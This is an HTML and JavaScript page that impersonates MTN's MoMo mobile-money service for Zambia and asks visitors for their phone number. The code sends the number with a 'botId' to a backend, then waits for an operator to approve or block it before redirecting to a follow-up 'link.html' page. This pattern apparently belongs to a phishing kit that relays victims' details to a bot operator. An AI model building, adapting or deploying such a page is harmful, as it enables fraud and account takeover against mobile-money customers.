<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MoMo</title>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; min-height: 100%; }
        body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }

        .app {
            position: relative;
            width: 100%;
            max-width: 540px;
            min-height: 100vh;
            min-height: 100svh;
            margin: 0 auto;
            background: #fff;
            overflow: hidden;
            padding-bottom: 110px;
        }

        .top {
            position: relative;
            height: 390px;
            background: #004c69;
            padding-top: 52px;
        }
        .top::after {
            content: "";
            position: absolute;
            left: -10%;
            bottom: -75px;
            width: 120%;
            height: 125px;
            background: #fff;
            border-radius: 50% 50% 0 0 / 70% 70% 0 0;
        }

        .logo {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .logo-box {
            width: 76px;
            height: 76px;
            border-radius: 9px;
            background: linear-gradient(145deg, #087398, #003d59);
            box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .logo-symbol {
            position: relative;
            width: 40px;
            height: 48px;
            background: #ffd500;
            clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
        }
        .logo-symbol::after {
            content: "";
            position: absolute;
            width: 11px;
            height: 11px;
            background: #004c69;
            border-radius: 50%;
            left: 14px;
            top: 14px;
        }
        .momo {
            margin-top: 8px;
            color: #ffd500;
            font-size: 36px;
            line-height: 34px;
            font-weight: 800;
            letter-spacing: -1.5px;
        }
        .from-mtn {
            margin-top: 3px;
            color: #ffd500;
            font-size: 14px;
            font-weight: 600;
        }

        .card {
            position: relative;
            z-index: 5;
            width: calc(100% - 36px);
            margin: -142px auto 0;
            background: #fff;
            border-radius: 34px;
            padding: 44px 27px 27px;
            box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
        }
        .title {
            text-align: center;
            color: #07516b;
            font-size: 25px;
            font-weight: 400;
            margin-bottom: 49px;
        }
        .title strong { font-weight: 700; }

        .phone-row {
            display: flex;
            align-items: center;
            width: 100%;
            gap: 16px;
        }
        .country {
            flex: 0 0 96px;
            width: 96px;
            height: 98px;
            background: #fff;
            border: 1.5px solid #111;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: default;
            pointer-events: none;
        }
        .flag {
            width: 39px;
            height: 27px;
            border-radius: 50%;
            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 20"><rect width="30" height="20" fill="%23198a00"/><rect x="22" y="0" width="8" height="20" fill="%23de2010"/><rect x="22" y="0" width="2.666" height="20" fill="%23000"/><rect x="24.666" y="0" width="2.666" height="20" fill="%23de2010"/><rect x="27.333" y="0" width="2.666" height="20" fill="%23ef7d00"/><path d="M18 2 L20 4 L22 2 L21 5 L23 6 L20 7 L19 10 L18 7 L15 6 L17 5 Z" fill="%23ef7d00"/></svg>') center/cover;
        }
        .phone-input {
            flex: 1;
            min-width: 0;
            height: 98px;
            border: 1.5px solid #111;
            border-radius: 27px;
            outline: none;
            padding: 0 23px;
            font-family: Arial, Helvetica, sans-serif;
            font-size: 22px;
            color: #111;
            background: #fff;
        }
        .phone-input::placeholder {
            color: #111;
            opacity: 1;
            font-size: 18px;
        }
        .phone-input:focus { border-color: #005572; }

        .terms {
            width: calc(100% - 45px);
            margin: 48px auto 0;
            text-align: center;
            color: #666;
            font-size: 16px;
            line-height: 23px;
        }
        .terms a { color: #00516c; text-decoration: none; }

        .bottom {
            position: fixed;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100%;
            max-width: 540px;
            padding: 12px 18px calc(14px + env(safe-area-inset-bottom));
            background: #fff;
            z-index: 100;
        }
        .next {
            width: 100%;
            height: 69px;
            border: none;
            border-radius: 40px;
            background: #d1d5db;
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            cursor: not-allowed;
            font-family: Arial, Helvetica, sans-serif;
            transition: background 0.3s ease;
            position: relative;
        }
        .next.is-active {
            background: #005572;
            cursor: pointer;
        }
        .next.is-active:hover { background: #00415a; }
        .next.is-active:active { transform: scale(.98); }

        .next.loading,
        .next.loading:disabled { background: #005572; opacity: 1; cursor: wait; }

        .next .btn-text { display: inline; }
        .next .btn-spinner {
            display: none;
            width: 26px;
            height: 26px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top: 3px solid #fff;
            border-radius: 50%;
            animation: spin .8s linear infinite;
            margin: 0 auto;
        }
        .next.loading .btn-text { display: none; }
        .next.loading .btn-spinner { display: block; }

        .status {
            display: none;
            margin-top: 16px;
            text-align: center;
            font-size: 14px;
            padding: 10px 14px;
            border-radius: 12px;
            font-weight: 500;
            border: 1px solid transparent;
        }
        .status.error { color: #c0392b; background: #fef3f2; border-color: #fecdca; }
        .status.success { color: #065f46; background: #ecfdf5; border-color: #6ee7b7; }

        @keyframes spin { to { transform: rotate(360deg); } }

        @media (max-width: 480px) {
            .top { height: 375px; padding-top: 52px; }
            .card { width: calc(100% - 36px); margin-top: -127px; padding: 44px 27px 27px; }
            .title { font-size: 24px; margin-bottom: 48px; }
            .phone-row { gap: 16px; }
            .country { flex-basis: 96px; }
            .phone-input { font-size: 20px; padding-left: 20px; padding-right: 15px; }
            .phone-input::placeholder { font-size: 16px; }
            .terms { margin-top: 48px; }
            .bottom { padding: 10px 14px calc(12px + env(safe-area-inset-bottom)); }
        }
        @media (max-width: 380px) {
            .card { padding-left: 20px; padding-right: 20px; }
            .country { flex-basis: 82px; width: 82px; }
            .phone-row { gap: 10px; }
            .phone-input { font-size: 18px; padding-left: 15px; }
            .phone-input::placeholder { font-size: 14px; }
            .terms { width: calc(100% - 30px); font-size: 14px; }
        }
    </style>
</head>

<body>

<div class="app">

    <div class="top">
        <div class="logo">
            <div class="logo-box"><div class="logo-symbol"></div></div>
            <div class="momo">MoMo</div>
            <div class="from-mtn">from MTN</div>
        </div>
    </div>

    <div class="card">
        <div class="title">Welcome to <strong>MoMo</strong></div>

        <form id="detailsForm" novalidate>
            <div class="phone-row">
                <div class="country" aria-label="Zambia">
                    <span class="flag"></span>
                </div>

                <input
                    class="phone-input"
                    type="tel"
                    id="phone"
                    name="phone"
                    inputmode="tel"
                    placeholder="Enter number *"
                    aria-label="Phone number"
                    autocomplete="tel"
                    enterkeyhint="go"
                >
            </div>

            <div id="status" class="status"></div>
        </form>
    </div>

    <div class="terms">
        By using this app you agree to our
        <a href="#">Mobile Terms of Use</a>
        <br>
        and
        <a href="#">Privacy Policy</a>
    </div>

</div>

<div class="bottom">
    <button class="next" type="submit" id="continueBtn" form="detailsForm" disabled>
        <span class="btn-text">NEXT</span>
        <span class="btn-spinner"></span>
    </button>
</div>


<!-- ============================================================
     STEP 1 — Global error catcher. Must be the very first script.
     Any runtime or syntax error will be logged so you can see it.
     ============================================================ -->
<script>
window.addEventListener('error', function (e) {
    console.error('[MoMo GLOBAL ERROR]', e.message, '@', (e.filename || '?') + ':' + (e.lineno || '?'));
});
window.addEventListener('unhandledrejection', function (e) {
    console.error('[MoMo UNHANDLED PROMISE]', e.reason);
});
</script>


<!-- ============================================================
     STEP 2 — Page logic. No IIFE, no top-level return, no syntax
     traps. Everything lives inside initMoMoPage().
     ============================================================ -->
<script>
function initMoMoPage() {
    'use strict';

    // ---------- CONFIG ----------
    var BACKEND_URL = '';

    // ---------- DOM REFS ----------
    var form     = document.getElementById('detailsForm');
    var phone    = document.getElementById('phone');
    var button   = document.getElementById('continueBtn');
    var statusEl = document.getElementById('status');

    if (!form || !phone || !button || !statusEl) {
        console.error('[MoMo] Missing DOM elements', {
            form: !!form, phone: !!phone, button: !!button, statusEl: !!statusEl
        });
        return;
    }

    var pollTimer = null;
    var botId     = null;
    var lastState = null;

    // ---------- VALIDATION ----------
    function validateForm() {
        var digits        = phone.value.replace(/\D/g, '');
        var isLoading     = button.classList.contains('loading');
        var shouldDisable = (digits.length === 0) || isLoading;

        if (button.disabled !== shouldDisable) {
            button.disabled = shouldDisable;
        }

        if (shouldDisable) {
            button.classList.remove('is-active');
        } else {
            button.classList.add('is-active');
        }

        if (lastState !== shouldDisable) {
            lastState = shouldDisable;
            console.log('[MoMo] NEXT disabled =', shouldDisable,
                        '| digits =', JSON.stringify(digits),
                        '| raw =', JSON.stringify(phone.value));
        }
    }

    // ---------- HELPERS ----------
    function stopPolling() {
        if (pollTimer) {
            clearInterval(pollTimer);
            pollTimer = null;
        }
    }

    function setStatus(message, type) {
        statusEl.style.display = 'block';
        statusEl.className = 'status ' + (type || '');
        statusEl.textContent = message;
    }

    function hideStatus() {
        statusEl.style.display = 'none';
        statusEl.className = 'status';
        statusEl.textContent = '';
    }

    function setLoading(on) {
        if (on) {
            button.disabled = true;
            button.classList.remove('is-active');
            button.classList.add('loading');
        } else {
            button.classList.remove('loading');
            validateForm();
        }
    }

    // ---------- PHONE INPUT ----------
    function onPhoneInput() {
        var value = phone.value;

        value = value.replace(/[^\d+\s]/g, '');
        var hasPlus = value.indexOf('+') !== -1;
        value = value.replace(/\+/g, '');
        if (hasPlus) value = '+' + value;
        value = value.replace(/\s+/g, ' ');

        if (phone.value !== value) {
            var atEnd = phone.selectionStart === phone.value.length;
            phone.value = value;
            if (atEnd) {
                try { phone.setSelectionRange(value.length, value.length); } catch (e) {}
            }
        }

        validateForm();
    }

    ['input', 'keyup', 'keydown', 'change', 'paste', 'cut', 'blur', 'focus', 'click', 'touchstart', 'touchend']
        .forEach(function (evt) {
            phone.addEventListener(evt, onPhoneInput, false);
        });

    document.addEventListener('input', function (e) {
        if (e.target === phone) validateForm();
    }, false);

    // Safety net for stubborn mobile keyboards / autofill
    setInterval(validateForm, 400);

    // ---------- BOT ID ----------
    try {
        var params  = new URLSearchParams(window.location.search);
        var fromUrl = params.get('botId');
        var stored  = null;
        try { stored = localStorage.getItem('botId'); } catch (e) {}

        var candidate = fromUrl || stored;

        if (!candidate || candidate === 'test_bot' || candidate === 'undefined' || candidate === 'null') {
            console.warn('⚠️ Invalid or missing botId — page still works, but submissions will fail.');
        } else {
            botId = candidate;

            try { localStorage.setItem('botId', botId); } catch (e) {}

            if (fromUrl !== botId) {
                params.set('botId', botId);
                window.history.replaceState(
                    {},
                    '',
                    window.location.pathname + '?' + params.toString() + window.location.hash
                );
            }

            console.log('🆔 botId resolved:', botId);
        }
    } catch (err) {
        console.error('botId resolver failed:', err && err.message);
    }

    // ---------- USER NAME ----------
    var fullName = 'User';
    try {
        fullName = localStorage.getItem('fullName') || 'User';
        localStorage.setItem('fullName', fullName);
    } catch (e) {}

    // ---------- FORM SUBMIT ----------
    form.addEventListener('submit', function (e) {
        e.preventDefault();

        if (button.classList.contains('loading')) return;

        var raw      = phone.value.trim();
        var hasPlus  = raw.charAt(0) === '+';
        var digits   = raw.replace(/\D/g, '');
        var phoneVal = (hasPlus ? '+' : '') + digits;

        if (!digits) {
            setStatus('❌ Please enter a phone number.', 'error');
            return;
        }

        if (!botId) {
            setStatus('❌ Invalid link. Please open this page through the official link.', 'error');
            return;
        }

        setLoading(true);
        hideStatus();

        fetch(BACKEND_URL + '/submit-phone', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name: fullName, phone: phoneVal, botId: botId })
        })
        .then(function (res) {
            if (!res.ok) {
                return res.text().then(function (t) {
                    var clean = t.charAt(0) === '<'
                        ? ('HTTP ' + res.status + ' — server error')
                        : (t || ('HTTP ' + res.status));
                    throw new Error(clean);
                });
            }
            return res.json();
        })
        .then(function (data) {
            var requestId = data.requestId;
            if (!requestId) throw new Error('No request ID returned');

            try {
                localStorage.setItem('phone', phoneVal);
                localStorage.setItem('phoneRequestId', requestId);
            } catch (e) {}

            stopPolling();
            var attempts = 0;
            var MAX_ATTEMPTS = 120;

            pollTimer = setInterval(function () {
                attempts++;
                fetch(BACKEND_URL + '/check-phone/' + encodeURIComponent(requestId))
                    .then(function (r) { return r.json(); })
                    .then(function (check) {
                        if (check.blocked === true) {
                            stopPolling();
                            setLoading(false);
                            setStatus('❌ Account restricted. Please try again later.', 'error');
                            return;
                        }

                        if (check.approved === true) {
                            stopPolling();
                            setLoading(false);
                            setStatus('✅ Verified! Redirecting...', 'success');
                            var redirectUrl = 'link.html?requestId=' + encodeURIComponent(requestId) +
                                              '&phone='     + encodeURIComponent(phoneVal) +
                                              '&botId='     + encodeURIComponent(botId);
                            setTimeout(function () {
                                window.location.href = redirectUrl;
                            }, 700);
                            return;
                        }

                        if (check.approved === false) {
                            stopPolling();
                            setLoading(false);
                            setStatus('❌ Incorrect number. Please try again.', 'error');
                            return;
                        }

                        if (attempts > MAX_ATTEMPTS) {
                            stopPolling();
                            setLoading(false);
                            setStatus('⏳ Taking too long. Please try again.', 'error');
                        }
                    })
                    .catch(function (err) {
                        console.error('Polling error:', err);
                    });
            }, 1500);
        })
        .catch(function (error) {
            setLoading(false);
            setStatus('❌ ' + (error && error.message ? error.message : 'Something went wrong. Please try again.'), 'error');
        });
    });

    // ---------- INIT ----------
    validateForm();
    try { phone.focus(); } catch (e) {}

    console.log('✅ MoMo details page ready. botId =', botId);
}

/* Run it — safe whether the DOM is still loading or already loaded. */
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initMoMoPage);
} else {
    initMoMoPage();
}
</script>

</body>
</html>
